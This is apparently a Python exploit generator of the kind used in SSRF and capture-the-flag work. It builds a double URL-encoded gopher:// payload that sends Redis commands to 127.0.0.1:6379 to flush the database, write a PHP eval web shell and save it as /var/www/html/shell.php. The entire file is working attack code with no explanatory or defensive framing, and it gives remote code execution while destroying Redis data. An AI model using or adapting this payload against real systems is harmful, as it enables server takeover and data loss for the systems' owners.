import urllib
from urllib import parse

protocol = "gopher://"
ip = "127.0.0.1"
port = "6379"
shell = "\n\n<?php eval($_POST[\"shell\"]);?>\n\n"
filename = "shell.php"
path = "/var/www/html"
passwd = ""
cmd = ["flushall",
       "set 1 {}".format(shell.replace(" ", "${IFS}")),
       "config set dir {}".format(path),
       "config set dbfilename {}".format(filename),
       "save"
       ]
if passwd:
    cmd.insert(0, "AUTH {}".format(passwd))
payload_prefix = protocol + ip + ":" + port + "/_"
CRLF = "\r\n"


def redis_format(arr):
    redis_arr = arr.split(" ")
    cmd_ = ""
    cmd_ += "*" + str(len(redis_arr))
    for x_ in redis_arr:
        cmd_ += CRLF + "$" + str(len((x_.replace("${IFS}", " ")))) + CRLF + x_.replace("${IFS}", " ")
    cmd_ += CRLF
    return cmd_


if __name__ == "__main__":
    payload = ""
    for x in cmd:
        payload += parse.quote(redis_format(x))  # url编码
    payload = payload_prefix + parse.quote(payload)  # 再次url编码
    print(payload)
